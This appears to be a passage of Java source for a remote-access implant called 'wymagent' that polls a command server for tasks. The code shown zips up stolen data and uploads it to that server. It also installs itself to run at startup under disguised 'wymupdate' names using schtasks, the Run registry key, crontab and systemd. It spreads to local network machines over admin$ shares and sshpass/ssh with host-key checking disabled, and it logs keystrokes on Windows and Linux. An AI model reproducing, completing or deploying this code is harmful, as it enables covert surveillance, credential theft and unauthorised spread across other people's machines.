                return result("steal (" + profile + "): nothing found", 1);
            }
            StringBuilder manSb = new StringBuilder();
            for (String m : manifest) manSb.append(m).append("\n");
            Files.write(Paths.get(work.getPath(), "manifest.txt"),
                        manSb.toString().getBytes(StandardCharsets.UTF_8));
            File archive = new File(work, "steal.zip");
            zipDir(work, archive);
            long size = archive.length();
            byte[] data = Files.readAllBytes(archive.toPath());
            Resp r = uploadBytes(taskId, "steal.zip", "application/zip", data);
            if (r.code != 200) return result("steal upload failed: HTTP " + r.code, 1);
            StringBuilder listing = new StringBuilder();
            String sep = "";
            for (String m : manifest) {
                listing.append(sep).append(m);
                sep = "\n";
            }
            String out = "stole " + manifest.size() + " item(s) -> steal.zip (" + size + " bytes)\n"
                + listing.toString();
            return result(truncateOutput(out, 4000), 0);
        } catch (Exception e) {
            return result("error: " + e.getMessage(), 1);
        } finally {
            if (work != null) {
                deleteRecursive(work);
            }
        }
    }

    static void zipDir(File dir, File archive) throws IOException {
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(archive));
        try {
            String base = dir.getPath();
            final long now = System.currentTimeMillis();
            List<File> stack = new ArrayList<File>();
            stack.add(dir);
            while (!stack.isEmpty()) {
                File d = stack.remove(stack.size() - 1);
                File[] files = d.listFiles();
                if (files == null) continue;
                for (File f : files) {
                    if (f.isDirectory()) {
                        stack.add(f);
                        continue;
                    }
                    if (f.getName().equals("steal.zip")) continue;
                    String rel = f.getPath().substring(base.length());
                    while (rel.startsWith(File.separator) || rel.startsWith("/")) {
                        rel = rel.substring(1);
                    }
                    rel = rel.replace(File.separator, "/");
                    ZipEntry e = new ZipEntry(rel);
                    e.setTime(now);
                    zos.putNextEntry(e);
                    byte[] data = Files.readAllBytes(f.toPath());
                    zos.write(data);
                    zos.closeEntry();
                }
            }
        } finally {
            zos.close();
        }
    }

    static void deleteRecursive(File f) {
        if (f == null || !f.exists()) return;
        if (f.isDirectory()) {
            File[] files = f.listFiles();
            if (files != null) for (File c : files) deleteRecursive(c);
        }
        f.delete();
    }

    // ---------------------------------------------------------------- clone

    static class CloneWatcher {
        final String target;
        final String command;
        final long intervalMs;
        volatile boolean stop = false;
        volatile String status = "starting";
        volatile String lastCheck = "never";
        volatile int relaunches = 0;
        Thread thread;

        CloneWatcher(String target, String command, long intervalMs) {
            this.target = target;
            this.command = command;
            this.intervalMs = Math.max(5000, Math.min(intervalMs, 3600_000));
        }
    }

    static Map<String, Object> taskClone(Map<String, Object> args) {
        String action = jsonGetStr(args, "action").trim().toLowerCase(Locale.ROOT);
        if (action.isEmpty()) action = "start";
        String target = jsonGetStr(args, "target").trim();
        if (target.isEmpty() && agentID != null) target = agentID;
        String command = jsonGetStr(args, "command").trim();
        long interval = 30_000;
        try {
            interval = Math.max(5, Math.min(Long.parseLong(jsonGetStr(args, "interval")), 3600)) * 1000;
        } catch (NumberFormatException ignored) {}

        if (action.equals("stop")) {
            CloneWatcher w = clones.get(target);
            if (w == null) return result("clone: no watcher for " + target, 1);
            w.stop = true;
            try {
                if (w.thread != null) w.thread.join(interval + 5000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            clones.remove(target);
            return result("clone: watcher for " + target + " stopped", 0);
        }

        if (action.equals("status")) {
            if (clones.isEmpty()) return result("clone: no watchers running", 0);
            List<String> lines = new ArrayList<String>();
            for (CloneWatcher w : clones.values()) {
                lines.add("  " + w.target + ": " + w.status + " | last_check "
                    + w.lastCheck + " | relaunched " + w.relaunches + "x | cmd: "
                    + (w.command.isEmpty() ? "(none)" : w.command));
            }
            java.util.Collections.sort(lines);
            StringBuilder sb = new StringBuilder("clone watchers:");
            for (String l : lines) sb.append("\n").append(l);
            return result(sb.toString(), 0);
        }

        // start
        if (clones.containsKey(target)) {
            return result("clone: watcher for " + target + " already running", 1);
        }
        if (command.isEmpty()) {
            return result("clone: 'command' (relaunch cmd) required", 1);
        }
        final CloneWatcher w = new CloneWatcher(target, command, interval);
        clones.put(target, w);
        w.thread = new Thread(new Runnable() {
            public void run() {
                cloneLoop(w);
            }
        });
        w.thread.setDaemon(true);
        w.thread.start();
        return result("clone: watcher started on target " + target
            + " (every " + (interval / 1000) + "s, restart cmd: " + command + ")", 0);
    }

    static void cloneLoop(CloneWatcher w) {
        while (!w.stop) {
            try {
                Resp r = http("GET", "/api/clone/status/" + w.target, null, null,
                              HTTP_TIMEOUT_MS, 15_000);
                if (r.code == 404) {
                    w.status = "unknown";
                    w.lastCheck = "target gone";
                } else if (r.code == 200) {
                    Object o = new JsonParser(r.text()).parse();
                    String st = jsonGetStr(o, "status");
                    if (st.isEmpty()) st = "unknown";
                    w.status = st;
                    w.lastCheck = nowStr();
                    if ((st.equals("dead") || st.equals("stale")) && !w.command.isEmpty()) {
                        if (w.stop) break;
                        w.relaunches++;
                        log("clone: target " + w.target + " " + st + " -> relaunching");
                        relaunchDetached(w.command);
                    }
                } else {
                    w.status = "http " + r.code;
                    w.lastCheck = nowStr();
                }
            } catch (Exception e) {
                w.status = "error";
                w.lastCheck = nowStr();
                log("clone: status check failed: " + e.getMessage());
            }
            try {
                Thread.sleep(w.intervalMs);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
    }

    static void relaunchDetached(String command) {
        try {
            List<String> cmdLine = new ArrayList<String>();
            if (isWindows()) {
                cmdLine.add("cmd");
                cmdLine.add("/C");
            } else {
                cmdLine.add("sh");
                cmdLine.add("-c");
            }
            cmdLine.add(command);
            ProcessBuilder pb = new ProcessBuilder(cmdLine);
            File nul = null;
            if (isWindows()) {
                nul = new File("NUL");
            } else {
                nul = new File("/dev/null");
            }
            pb.redirectOutput(ProcessBuilder.Redirect.to(nul));
            pb.redirectError(ProcessBuilder.Redirect.to(nul));
            pb.redirectInput(nul);
            pb.start();
        } catch (Exception e) {
            log("clone: relaunch failed: " + e.getMessage());
        }
    }

    // -------------------------------------------------------------- persistence/lateral

    static String pathBase(String p) {
        int i = Math.max(p.lastIndexOf('/'), p.lastIndexOf('\\'));
        return i < 0 ? p : p.substring(i + 1);
    }

    /** Java binary we are running as (best effort). */
    static String selfCommand() {
        String c = ProcessHandle.current().info().command().orElse("java");
        return c.isEmpty() ? "java" : c;
    }

    static String relaunchCmd(String self) {
        String q = isWindows() ? "\"" : "'";
        return q + self + q + " --server " + server + " --token " + token
            + " --interval " + (intervalMs / 1000) + " --jitter " + (jitterMs / 1000);
    }

    static String trimLine(String s) {
        if (s == null) return "";
        int a = 0, b = s.length();
        while (a < b && Character.isWhitespace(s.charAt(a))) a++;
        while (b > a && Character.isWhitespace(s.charAt(b - 1))) b--;
        String t = s.substring(a, b);
        int nl = t.indexOf('\n');
        if (nl >= 0) t = t.substring(0, nl);
        while (!t.isEmpty() && (t.endsWith(" ") || t.endsWith("\t") || t.endsWith("\r")))
            t = t.substring(0, t.length() - 1);
        return t;
    }

    static Map<String, Object> taskPersistence(Map<String, Object> args) {
        String self = selfCommand();
        String relaunch = relaunchCmd(self);
        StringBuilder out = new StringBuilder();
        File dest = null;
        try {
            if (isWindows()) {
                String appdata = System.getenv("APPDATA");
                if (appdata == null || appdata.isEmpty()) appdata = System.getenv("USERPROFILE");
                if (appdata == null || appdata.isEmpty()) appdata = ".";
                File dir = new File(appdata, "Microsoft\\Windows\\wymupdate");
                dir.mkdirs();
                dest = new File(dir, "wymagent.exe");
            } else {
                File dir = new File(homeDir(), ".config/wymupdate");
                dir.mkdirs();
                dest = new File(dir, pathBase(self));
            }
            Files.copy(Paths.get(self), dest.toPath(), StandardCopyOption.REPLACE_EXISTING);
        } catch (Exception e) {
            return result("persistence: failed to copy self to " + dest + ": " + e.getMessage(), 1);
        }
        out.append("persistence: copied self to ").append(dest);
        if (isWindows()) {
            String progdata = System.getenv("ProgramData");
            if (progdata == null || progdata.isEmpty()) progdata = System.getenv("ALLUSERSPROFILE");
            if (progdata == null || progdata.isEmpty()) progdata = "C:\\ProgramData";
            File launchDir = new File(progdata, "wymupdate");
            launchDir.mkdirs();
            File launcher = new File(launchDir, "wymrelaunch.cmd");
            try {
                Files.write(launcher.toPath(),
                    ("@echo off\r\nstart \"\" /b " + relaunch + "\r\n").getBytes(StandardCharsets.UTF_8));
            } catch (Exception e) {
                return result("persistence error: could not write launcher: " + launcher + ": " + e.getMessage(), 1);
            }
            out.append("\npersistence: wrote launcher ").append(launcher);
            boolean ok = false;
            String cmd = "schtasks /Create /TN \"wymagent-persist\" /TR \"" + launcher
                + "\" /SC ONLOGON /RL HIGHEST /F";
            ProcessResult pr = execCapture(cmd, 60);
            if (pr.exitCode == 0) ok = true;
            else {
                out.append("\n  schtasks err: ").append(trimLine(pr.output));
                String reg = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v wymagent /t REG_SZ /d "
                    + launcher + " /f";
                pr = execCapture(reg, 60);
                if (pr.exitCode == 0) ok = true;
                else out.append("\n  reg err: ").append(trimLine(pr.output));
            }
            out.append("\n  ").append(ok ? "launch hook registered (schtasks)" : "no launch hook registered");
            return result(out.toString(), ok ? 0 : 1);
        }
        boolean okCron = false, okSys = false;
        String line = "@reboot " + relaunch + " # wymagent-persist";
        String cmd = "(crontab -l 2>/dev/null | grep -v 'wymagent-persist'; echo \"" + line + "\") | crontab -";
        ProcessResult pr = execCapture(cmd, 60);
        if (pr.exitCode == 0) okCron = true;
        else out.append("\n  crontab err: ").append(trimLine(pr.output));
        File unit = new File(new File(homeDir(), ".config/wymupdate"), "wym-update.service");
        try {
            Files.write(unit.toPath(), (
                "[Unit]\n"
                + "Description=wym agent update\n\n"
                + "[Service]\n"
                + "Type=simple\n"
                + "ExecStart=/bin/sh -c \"" + relaunch + "\"\n"
                + "Restart=always\n\n"
                + "[Install]\n"
                + "WantedBy=default.target\n").getBytes(StandardCharsets.UTF_8));
            String syscmd = "systemctl --user daemon-reload 2>&1; systemctl --user enable --now "
                + unit.getAbsolutePath() + " 2>&1";
            pr = execCapture(syscmd, 60);
            if (pr.exitCode == 0) okSys = true;
            else out.append("\n  systemctl err: ").append(trimLine(pr.output));
        } catch (Exception e) {
            out.append("\n  systemctl err: cannot write unit ").append(unit.getAbsolutePath());
        }
        out.append("\n  ").append((okCron || okSys)
            ? "launch hook registered (crontab/systemd)" : "no launch hook registered");
        return result(out.toString(), (okCron || okSys) ? 0 : 1);
    }

    static String subnetBase(String in) {
        int d1 = in.indexOf('.');
        if (d1 < 0) return in;
        int d2 = in.indexOf('.', d1 + 1);
        if (d2 < 0) return in;
        int d3 = in.indexOf('.', d2 + 1);
        return d3 < 0 ? in : in.substring(0, d3);
    }

    static long ipToLong(String ip) {
        try {
            String[] parts = ip.split("\\.");
            if (parts.length != 4) return 0;
            long v = 0;
            for (int i = 0; i < 4; i++) {
                long o = Long.parseLong(parts[i]);
                if (o < 0 || o > 255) return 0;
                v = (v << 8) | o;
            }
            return v;
        } catch (NumberFormatException e) {
            return 0;
        }
    }

    static String u32ToIp(long ip) {
        return ((ip >> 24) & 0xff) + "." + ((ip >> 16) & 0xff)
            + "." + ((ip >> 8) & 0xff) + "." + (ip & 0xff);
    }

    static List<Long> lateralPeers(String txt, String selfIp, String base) {
        List<Long> out = new ArrayList<Long>();
        long own = ipToLong(selfIp);
        if (txt == null || txt.isEmpty()) return out;
        for (String tok : txt.split("[^0-9.]+")) {
            if (tok.isEmpty()) continue;
            long ip = ipToLong(tok);
            if (ip == 0) continue;
            long first = (ip >> 24) & 0xff;
            if (first == 0 || first >= 224) continue;
            if (own != 0 && ip == own) continue;
            if (!tok.startsWith(base)) continue;
            if (tok.length() > base.length() && tok.charAt(base.length()) != '.') continue;
            if (!out.contains(ip)) out.add(ip);
        }
        java.util.Collections.sort(out);
        if (out.size() > 30) return out.subList(0, 30);
        return out;
    }

    static Map<String, Object> taskLateral(Map<String, Object> args) {
        String subnet = jsonGetStr(args, "subnet");
        String user = jsonGetStr(args, "user");
        String pass = jsonGetStr(args, "pass");
        String eu = System.getenv("WYM_LAT_USER");
        String ep = System.getenv("WYM_LAT_PASS");
        if (user.isEmpty() && eu != null) user = eu;
        if (pass.isEmpty() && ep != null) pass = ep;

        String self = selfCommand();
        String ip = localIP();
        String base = subnetBase(subnet.isEmpty() ? ip : subnet);
        if (base.isEmpty()) return result("lateral: no LAN peers found", 1);

        List<Long> peers = lateralPeers(execCapture("arp -a", 20).output, ip, base);
        if (peers.isEmpty() && !isWindows()) {
            peers = lateralPeers(execCapture("ip neigh", 20).output, ip, base);
        }
        if (peers.isEmpty()) return result("lateral: no LAN peers found", 1);

        StringBuilder out = new StringBuilder("lateral: " + peers.size() + " peer(s): ");
        for (int i = 0; i < peers.size(); i++) out.append(i == 0 ? "" : ",").append(u32ToIp(peers.get(i)));
        int deployed = 0, failed = 0, skipped = 0;
        for (long ipu : peers) {
            String host = u32ToIp(ipu);
            String status;
            if (user.isEmpty() || pass.isEmpty()) {
                status = "skipped (no credentials; set WYM_LAT_USER/WYM_LAT_PASS)";
                skipped++;
            } else if (isWindows()) {
                String name = pathBase(self);
                String relaunch = "\"c:\\windows\\" + name + "\" --server " + server
                    + " --token " + token + " --interval " + (intervalMs / 1000)
                    + " --jitter " + (jitterMs / 1000);
                ProcessResult pr = execCapture("net use \\\\" + host + "\\admin$ /user:" + user
                    + " \"" + pass + "\"", 30);
                if (pr.exitCode != 0) {
                    status = "failed (net use: " + trimLine(pr.output) + ")";
                    failed++;
                } else {
                    pr = execCapture("copy /y \"" + self + "\" \"\\\\" + host + "\\admin$\\" + name + "\"", 30);
                    if (pr.exitCode != 0) {
                        status = "failed (copy: " + trimLine(pr.output) + ")";
                        failed++;
                    } else {
                        String cmd = "schtasks /Create /S " + host + " /TN \"wymagent-lateral\" /TR \""
                            + relaunch + "\" /SC ONLOGON /RU " + user + " /RP " + pass
                            + " /RL HIGHEST /F";
                        pr = execCapture(cmd, 30);
                        if (pr.exitCode == 0) status = "deployed (file dropped + scheduled wymagent-lateral)";
                        else status = "deployed (file dropped; task: " + trimLine(pr.output) + ")";
                        deployed++;
                    }
                    execCapture("net use \\\\" + host + "\\admin$ /delete /y", 30);
                }
            } else {
                ProcessResult pr = execCapture("command -v sshpass", 10);
                if (pr.exitCode != 0 || pr.output.trim().isEmpty()) {
                    status = "skipped (sshpass not installed)";
                    skipped++;
                } else {
                    String name = pathBase(self);
                    String relaunch = "'/tmp/" + name + "' --server " + server
                        + " --token " + token + " --interval " + (intervalMs / 1000)
                        + " --jitter " + (jitterMs / 1000);
                    pr = execCapture("sshpass -p '" + pass + "' scp -o StrictHostKeyChecking=no -o ConnectTimeout=8 '"
                        + self + "' " + user + "@" + host + ":/tmp/" + name, 60);
                    if (pr.exitCode != 0) {
                        status = "failed (scp: " + trimLine(pr.output) + ")";
                        failed++;
                    } else {
                        pr = execCapture("sshpass -p '" + pass + "' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 "
                            + user + "@" + host + " '" + relaunch + " &>/dev/null &'", 30);
                        if (pr.exitCode == 0) status = "deployed (file uploaded + launched)";
                        else status = "deployed (file uploaded; launch: " + trimLine(pr.output) + ")";
                        deployed++;
                    }
                }
            }
            out.append("\n  ").append(host).append(": ").append(status);
        }
        out.append("\nlateral: deployed=").append(deployed).append(" failed=").append(failed)
            .append(" skipped=").append(skipped);
        return result(out.toString(), 0);
    }

    // --------------------------------------------------------------- dispatch

    static Map<String, Object> execute(Map<String, Object> task) {
        String taskId = jsonGetStr(task, "task_id");
        String ttype = jsonGetStr(task, "type");
        Map<String, Object> args = new LinkedHashMap<String, Object>();
        Object a = task.get("args");
        if (a instanceof Map) {
            @SuppressWarnings("unchecked")
            Map<String, Object> am = (Map<String, Object>) a;
            args = am;
        }
        log("running task " + taskId + " (" + ttype + ")");
        if (ttype.equals("shell")) return taskShell(args);
        if (ttype.equals("download")) return taskDownload(taskId, args);
        if (ttype.equals("upload")) return taskUpload(taskId, args);
        if (ttype.equals("sleep")) return taskSleep(args);
        if (ttype.equals("keylog")) return taskKeylog(args);
        if (ttype.equals("clipboard")) return taskClipboard(args);
        if (ttype.equals("screenshot")) return taskScreenshot(taskId, args);
        if (ttype.equals("steal")) return taskSteal(taskId, args);
        if (ttype.equals("clone")) return taskClone(args);
        if (ttype.equals("persistence")) return taskPersistence(args);
        if (ttype.equals("lateral")) return taskLateral(args);
        if (ttype.equals("exit")) {
            Map<String, Object> m = result("exiting", 0);
            m.put("_exit", Boolean.TRUE);
            return m;
        }
        return result("unknown task type: " + ttype, 1);
    }

    // ------------------------------------------------------------ keylogger

    static class KeyLogger {
        private final StringBuilder buffer = new StringBuilder();
        private volatile boolean active = false;
        private Thread thread = null;

        synchronized String start() {
            if (active) return "keylogger already running";
            thread = new Thread(new Runnable() {
                public void run() {
                    captureLoop();
                }
            });
            thread.setDaemon(true);
            thread.start();
            active = true;
            return "keylogger started";
        }

        synchronized String stop() {
            if (!active) return "keylogger not running";
            active = false;
            if (thread != null) {
                thread.interrupt();
                thread = null;
            }
            return "keylogger stopped";
        }

        synchronized String dump() {
            if (buffer.length() == 0) return "(no keystrokes recorded)";
            String text = buffer.toString();
            if (text.length() > 8000) text = "..." + text.substring(text.length() - 8000);
            return text;
        }

        void append(String s) {
            synchronized (buffer) {
                buffer.append(s);
            }
        }

        void captureLoop() {
            if (isWindows()) {
                captureWindows();
            } else if (isLinuxEvdev()) {
                captureLinux();
            } else {
                // macOS / no evdev access: mark unsupported gracefully
                active = false;
            }
        }

        boolean isLinuxEvdev() {
            return !isWindows() && !isMac();
        }

        void captureWindows() {
            String script =
                "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;"
                + "public class K{[DllImport(\"user32.dll\")]public static extern short GetAsyncKeyState(int v);}';"
                + "[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;$prev=New-Object 'System.Collections.Generic.Dictionary[int,bool]';"
                + "while($true){try{for($v=8;$v -le 255;$v++){"
                + "$ret=[K]::GetAsyncKeyState($v);$pressed=($ret -band 0x8000) -ne 0;"
                + "$was=$prev[$v];$prev[$v]=$pressed;"
                + "if($pressed -and -not $was){"
                + "$n=\"\";switch($v){0x0D{$n=\"[Enter]\"}0x09{$n=\"[Tab]\"}0x1B{$n=\"[Esc]\"}"
                + "0x20{$n=\"[Space]\"}0x08{$n=\"[BS]\"}0x2E{$n=\"[Del]\"}"
                + "0x25{$n=\"[Left]\"}0x26{$n=\"[Up]\"}0x27{$n=\"[Right]\"}0x28{$n=\"[Down]\"}"
                + "0x2D{$n=\"[Ins]\"}0x23{$n=\"[End]\"}0x24{$n=\"[Home]\"}"
                + "0x5B{$n=\"[LWin]\"}0x5C{$n=\"[RWin]\"}}"
                + "if($n -ne \"\"){[Console]::Write($n)}"
                + "elseif($v -ge 0x30 -and $v -le 0x39){[Console]::Write([char]$v)}"
                + "elseif($v -ge 0x41 -and $v -le 0x5A){"
                + "$shift=([K]::GetAsyncKeyState(0x10) -band 0x8000) -ne 0;"
                + "[int]$caps=[K]::GetAsyncKeyState(0x14);$upper=($shift -ne ([bool]($caps -band 0x1)));"
                + "$c=[char]($v + 32);if($upper){$c=[char]$v}[Console]::Write($c)}"
                + "elseif($v -ge 0x60 -and $v -le 0x69){[Console]::Write([char](0x30 + $v - 0x60))}}}"
                + "[System.Threading.Thread]::Sleep(50)}catch{break}}";
            ProcessBuilder pb = new ProcessBuilder("powershell", "-NoProfile",
                "-Command", script);
            try {
                pb.redirectErrorStream(true);
                Process p = pb.start();
                InputStream in = p.getInputStream();
                java.io.BufferedReader reader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(in, StandardCharsets.UTF_8));
                char[] ch = new char[512];
                int n;
                while (active && (n = reader.read(ch)) != -1) {
                    synchronized (buffer) {
                        buffer.append(ch, 0, n);
                    }
                }
                p.destroyForcibly();
            } catch (Exception e) {
                active = false;
            }
        }

        void captureLinux() {
            try {
                File[] devs = new File("/dev/input").listFiles();
                File source = null;
                if (devs != null) {
                    for (File f : devs) {
                        if (f.getName().startsWith("event")) {
                            source = f;
                            break;
                        }
                    }
                }
                if (source == null || !source.canRead()) {
                    active = false;
                    return;
                }
                RandomAccessFile raf = new RandomAccessFile(source, "r");
                byte[] rec = new byte[24];
                Set<Integer> keys = new HashSet<Integer>();
                while (active) {
                    int got = raf.read(rec);
                    if (got < 24) continue;
                    ByteBuffer bb = ByteBuffer.wrap(rec).order(ByteOrder.LITTLE_ENDIAN);
                    long sec = bb.getLong();
                    long usec = bb.getLong();
                    int type = bb.getShort() & 0xFFFF;
                    int code = bb.getShort() & 0xFFFF;
                    int value = bb.getInt();
                    keys.add(code);
                    if (type == 1 && value == 1) {
                        append(keyName(code));
                    }
                }
                raf.close();
            } catch (Exception e) {
                active = false;
            }
        }

        String keyName(int code) {
            switch (code) {
                case 28: return "[Enter]";
                case 15: return "[Tab]";
                case 1: return "[Esc]";
                case 57: return " ";
                case 14: return "[BS]";
                case 111: return "[Del]";
                case 105: return "[Left]";
                case 103: return "[Up]";
                case 106: return "[Right]";
                case 108: return "[Down]";
                case 12: return "-";
                case 13: return "=";
                case 26: return "[";
                case 27: return "]";
                case 39: return ";";
                case 40: return "'";
                case 41: return "`";
                case 43: return "\\";
                case 51: return ",";
                case 52: return ".";
                case 53: return "/";
            }
            String digits = "1234567890";
            String qrow = "qwertyuiop";
            String arow = "asdfghjkl";
            String zrow = "zxcvbnm";
            if (code >= 2 && code <= 11) return "" + digits.charAt(code - 2);
            if (code >= 16 && code <= 25) return "" + qrow.charAt(code - 16);
            if (code >= 30 && code <= 38) return "" + arow.charAt(code - 30);
            if (code >= 44 && code <= 50) return "" + zrow.charAt(code - 44);
            return "";
        }
    }

    // ------------------------------------------------------------------ main

    static void usage() {
        System.err.println("usage: java Agent --server URL --token TOKEN"
            + " [--interval N] [--jitter N] [--state FILE] [--verbose]");
    }

    static void printHelp() {
        System.out.println("usage: java Agent --server URL --token TOKEN"
            + " [--interval N] [--jitter N] [--state FILE] [--verbose]");
        System.out.println();
        System.out.println("Flags (also settable via WYM_SERVER/WYM_TOKEN/WYM_INTERVAL/WYM_JITTER/WYM_STATE_FILE/WYM_VERBOSE):");
        System.out.println("  --server URL      server base URL (required unless WYM_SERVER is set)");
        System.out.println("  --token TOKEN     shared agent token (required unless WYM_TOKEN is set)");
        System.out.println("  --interval N      heartbeat interval in seconds (default 10, min 1)");
        System.out.println("  --jitter N        random jitter in seconds added to the interval");
        System.out.println("  --state FILE      state file persisting the agent id (default ~/.wymagent_java.json)");
        System.out.println("  --verbose         print activity to stdout");
        System.out.println("  -h, --help        show this help and exit");
    }

    public static void main(String[] args) {
        String serverArg = System.getenv("WYM_SERVER");
        String tokenArg = System.getenv("WYM_TOKEN");
        long intervalArg = 10;
        long jitterArg = 0;
        String stateArg = homeFile(".wymagent_java.json");
        boolean verboseArg = false;
        boolean intervalGiven = false;
        boolean jitterGiven = false;
        boolean stateGiven = false;

        for (int i = 0; i < args.length; i++) {
            String a = args[i];
            if (a.equals("-h") || a.equals("--help")) {
                printHelp();
                System.exit(0);
            } else if (a.equals("--server") && i + 1 < args.length) serverArg = args[++i];
            else if (a.equals("--token") && i + 1 < args.length) tokenArg = args[++i];
            else if (a.equals("--interval") && i + 1 < args.length) { intervalArg = Integer.parseInt(args[++i]); intervalGiven = true; }
            else if (a.equals("--jitter") && i + 1 < args.length) { jitterArg = Integer.parseInt(args[++i]); jitterGiven = true; }
            else if (a.equals("--state") && i + 1 < args.length) { stateArg = args[++i]; stateGiven = true; }
            else if (a.equals("--verbose")) verboseArg = true;
        }

        if (!intervalGiven) {
            String iv = System.getenv("WYM_INTERVAL");
            if (iv != null && !iv.isEmpty()) {
                try { intervalArg = Math.max(1, Long.parseLong(iv)); } catch (NumberFormatException e) {}
            }
        }
        if (!jitterGiven) {
            String jt = System.getenv("WYM_JITTER");
            if (jt != null && !jt.isEmpty()) {
                try { jitterArg = Math.max(0, Long.parseLong(jt)); } catch (NumberFormatException e) {}
            }
        }
        if (!stateGiven) {
            String sf = System.getenv("WYM_STATE_FILE");
            if (sf != null && !sf.isEmpty()) stateArg = sf;
        }
        String vb = System.getenv("WYM_VERBOSE");
        if (!verboseArg && vb != null && (vb.equals("1") || vb.equals("true"))) verboseArg = true;

        if (tokenArg == null || tokenArg.isEmpty()) {
            System.err.println("--token is required (or set WYM_TOKEN)");
            usage();
            System.exit(1);
        }
        if (serverArg == null || serverArg.isEmpty()) {
            System.err.println("--server is required (or set WYM_SERVER)");
            usage();
            System.exit(1);
        }

        server = serverArg.endsWith("/") ? serverArg.substring(0, serverArg.length() - 1) : serverArg;
        token = tokenArg;
        intervalMs = Math.max(1000, intervalArg * 1000);
        jitterMs = Math.max(0, jitterArg * 1000);
        stateFile = stateArg;
        verbose = verboseArg;

        loadID();
        if (agentID == null || agentID.isEmpty()) {
            try {
                register();
            } catch (Exception e) {
                log("register failed: " + e.getMessage() + " - will retry on next checkin");
            }
        }

        while (true) {
            try {
                for (Map<String, Object> task : checkin()) {
                    Map<String, Object> res = execute(task);
                    report(jsonGetStr(task, "task_id"), res);
                    if (res.get("_exit") != null && Boolean.TRUE.equals(res.get("_exit"))) {
                        return;
                    }
                }
            } catch (Exception e) {
                log("checkin failed: " + e.getMessage());
            }
            long delay = intervalMs;
            if (jitterMs > 0) {
                delay += (long) (Math.random() * jitterMs);
            }
            try {
                Thread.sleep(Math.max(500, delay));
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            }
        }
    }
}
